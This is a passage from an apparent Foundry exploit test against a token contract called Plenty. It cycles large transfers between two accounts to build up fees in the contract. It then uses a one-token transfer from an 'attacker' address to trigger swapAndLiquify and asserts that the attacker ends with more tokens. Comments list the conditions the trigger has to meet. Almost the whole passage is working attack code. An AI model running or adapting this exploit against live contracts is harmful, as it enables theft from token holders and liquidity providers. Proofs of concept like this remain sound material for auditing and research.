        // Fees accumulate in contract address
        for (uint i = 0; i < 10; i++) {
            vm.prank(feeGen1);
            IPlenty(TARGET).transfer(feeGen2, 1000000 * 10**6 * 10**18);

            vm.prank(feeGen2);
            IPlenty(TARGET).transfer(feeGen1, 1000000 * 10**6 * 10**18);
        }

        uint256 contractBalance = IPlenty(TARGET).balanceOf(TARGET);
        console.log("Contract accumulated fees:", contractBalance);

        // Check if we meet the threshold for swapAndLiquify
        // Need contractTokenBalance = balanceOf(TARGET) - _lockedAmount >= numTokensSellToAddToLiquidity
        // _lockedAmount might be zero if no locks
        if (contractBalance < requiredTokens) {
            // Need more fee accumulation
            for (uint i = 0; i < 5; i++) {
                vm.prank(feeGen1);
                IPlenty(TARGET).transfer(feeGen2, 2000000 * 10**6 * 10**18);

                vm.prank(feeGen2);
                IPlenty(TARGET).transfer(feeGen1, 2000000 * 10**6 * 10**18);
            }
            contractBalance = IPlenty(TARGET).balanceOf(TARGET);
            console.log("Updated contract fee balance:", contractBalance);
        }

        // Ensure swapAndLiquify is enabled
        bool enabled = IPlenty(TARGET).swapAndLiquifyEnabled();
        console.log("swapAndLiquifyEnabled:", enabled);

        // Get uniswapV2Pair address to avoid transferring from/to it
        address pair = IPlenty(TARGET).uniswapV2Pair();
        console.log("Uniswap pair:", pair);

        // Trigger swapAndLiquify by making a transfer from attacker
        // Must not be from uniswapV2Pair (we're attacker, not pair)
        // Must not be to owner (but can be any other address)
        address random = address(0x333);
        console.log("Making trigger transfer from attacker...");
        uint256 attackerBalanceBefore = IPlenty(TARGET).balanceOf(attacker);
        IPlenty(TARGET).transfer(random, 1);

        uint256 finalBalance = IPlenty(TARGET).balanceOf(attacker);
        console.log("Final attacker balance:", finalBalance);
        console.log("Profit:", finalBalance - attackerBalanceBefore);

        assertGt(finalBalance, attackerBalanceBefore, "Attacker should gain tokens");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

